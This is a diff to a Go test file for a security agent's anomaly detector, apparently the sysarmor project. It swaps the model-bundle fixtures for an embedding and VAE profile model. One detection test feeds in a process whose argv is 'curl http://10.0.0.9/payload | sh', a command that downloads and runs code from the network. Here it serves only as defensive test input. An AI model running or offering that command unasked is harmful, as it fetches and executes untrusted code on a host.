@@ -13,7 +13,7 @@ import (
 	"testing"
 
 	domainmodel "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/domain/detection/model"
-	domainevent "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/domain/event"
+	domainprocess "github.com/sysarmor/sysarmor-next-project/apps/agent/internal/domain/process"
 )
 
 func TestDecodeModelBundleRequiresPayloadDigest(t *testing.T) {
@@ -96,7 +96,7 @@ func TestDecodeModelBundleRejectsSubPrecisionTampering(t *testing.T) {
 		t.Fatal(err)
 	}
 	document := signModelDocument(validModelDocument(), "release-test", privateKey)
-	document.Mean[0] = 0.0000004
+	document.Embedding.Tokens[0].Vector[0] = 0.0000004
 	raw, err := json.Marshal(document)
 	if err != nil {
 		t.Fatal(err)
@@ -231,10 +231,10 @@ func TestLoadModelBundleLoadsCollectedBundle(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	signals := detector.Process(domainevent.Event{
-		ID: "anomaly-001", Behavior: "process.exec", SubjectPresent: true,
-		Subject: domainevent.Process{Argv: []string{"bash", "-c", "curl", "sh", "--debug"}},
-		Object:  domainevent.Object{SocketAddress: "10.0.0.9:443"}, ParentStableID: "proc-unknown",
+	signals := detector.Process(domainprocess.Snapshot{
+		StableID: "proc-evil", ParentStableID: "proc-unknown", LineageID: "proc-evil", Binary: "/bin/bash", Revision: 1,
+		Argv: []string{"bash", "-c", "curl http://10.0.0.9/payload | sh", "--no-profile", "--debug"}, Networks: []string{"10.0.0.9:443"},
+		EventRefs: []string{"anomaly-001"}, State: domainprocess.StateActive,
 	})
 	if len(signals) != 1 {
 		t.Fatalf("signals = %+v", signals)
@@ -282,8 +282,22 @@ func repositoryRoot(t testing.TB) string {
 
 func validModelDocument() modelBundleDocument {
 	document := modelBundleDocument{
-		ModelRef: "model:normal-v1", ModelVersion: "1", FeatureSchema: domainmodel.FeatureSchemaV1,
-		Mean: []float64{0, 0, 0, 0, 0, 0}, Scale: []float64{1, 1, 1, 1, 1, 1}, Threshold: 1,
+		ModelRef: "model:profile-v2", ModelVersion: "2", FeatureSchema: domainmodel.FeatureSchemaV2,
+		PreprocessorVersion: "process-profile-v1", Threshold: 1,
+		Embedding: embeddingDocument{
+			Dimension: 2, MinN: 3, MaxN: 4, BucketCount: 4,
+			Tokens: []tokenVectorDocument{{Token: "cmd:bash", Vector: []float64{10, 0}}},
+		},
+		Rarity: rarityDocument{DefaultFile: 2, DefaultNetwork: 2},
+		VAE: vaeDocument{
+			InputDimension: 2, HiddenDimension: 2, LatentDimension: 1,
+			EncoderWeights: []float64{0, 0, 0, 0}, EncoderBias: []float64{0, 0},
+			MeanWeights: []float64{0, 0}, MeanBias: []float64{0},
+			LogVarWeights: []float64{0, 0}, LogVarBias: []float64{0},
+			DecoderWeights: []float64{0, 0}, DecoderBias: []float64{0, 0},
+			OutputWeights: []float64{0, 0, 0, 0}, OutputBias: []float64{0, 0},
+		},
+		Stability: stabilityDocument{Default: 1, Processes: []weightedValueDocument{{Value: "bash", Weight: 1}}},
 	}
 	modelSum := sha256.Sum256(digestMaterial(document, false))
 	document.ModelDigest = "sha256:" + hex.EncodeToString(modelSum[:])
